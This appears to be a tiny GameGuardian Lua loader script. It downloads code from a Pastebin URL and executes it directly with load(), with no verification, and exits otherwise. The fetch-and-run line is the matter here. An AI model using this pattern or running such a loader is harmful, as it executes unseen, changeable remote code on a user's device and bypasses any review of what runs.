local Source = gg.makeRequest("https://pastebin.com/raw/1wMArmLN").content

if Source then
pcall(load(Source))
 else
os.exit()
end